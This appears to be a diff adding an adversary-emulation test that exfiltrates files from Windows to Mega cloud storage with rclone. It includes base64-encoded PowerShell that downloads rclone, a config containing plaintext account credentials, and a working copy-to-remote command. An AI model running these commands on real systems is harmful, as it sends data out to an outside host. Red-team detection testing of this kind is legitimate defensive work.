@@ -1,0 +1,31 @@
+- id: 07f00b58-f1c3-54ef-8a77-ab8ca512b5a6
+  name: Soumaia ART Tests - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
+  description: 'This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
+
+    See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/'
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUADEANQA2ADcALgAwADAAMgBcAHIAYwBsAG8AbgBlAC0AdgAqAFwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZABvAHcAbgBsAG8AYQBkAHMALgByAGMAbABvAG4AZQAuAG8AcgBnAC8AcgBjAGwAbwBuAGUALQBjAHUAcgByAGUAbgB0AC0AdwBpAG4AZABvAHcAcwAtAGEAbQBkADYANAAuAHoAaQBwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAcgBjAGwAbwBuAGUALgB6AGkAcAAiAAoARQB4AHAAYQBuAGQALQBhAHIAYwBoAGkAdgBlACAALQBwAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHIAYwBsAG8AbgBlAC4AegBpAHAAIgAgAC0AZABlAHMAdABpAG4AYQB0AGkAbwBuAHAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAVAAxADUANgA3AC4AMAAwADIAXAAiACAALQBmAG8AcgBjAGUACgA=
+          }
+          New-Item $env:appdata\rclone -ItemType directory
+          New-Item $env:appdata\rclone\rclone.conf
+          cd "$env:TEMP\ART-ExternalPayloads\T1567.002\rclone-v*\"
+          .\rclone.exe config create T1567002 mega
+          set-Content $env:appdata\rclone\rclone.conf "[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
+          .\rclone.exe copy --max-size 1700k "$env:TEMP\ART-ExternalPayloads\T1567.002" T1567002:test -v
+        cleanup: |-
+          cd "$env:TEMP\ART-ExternalPayloads\T1567.002\rclone-v*\"
+          .\rclone.exe purge T1567002:test
+          .\rclone.exe config delete T1567002:
+          Remove-Item $env:appdata\rclone -recurse -force -erroraction silentlycontinue
+          cd c:\
+          Remove-Item "$env:TEMP\ART-ExternalPayloads\rclone.zip"
+          Remove-Item "$env:TEMP\ART-ExternalPayloads\T1567.002" -recurse -force
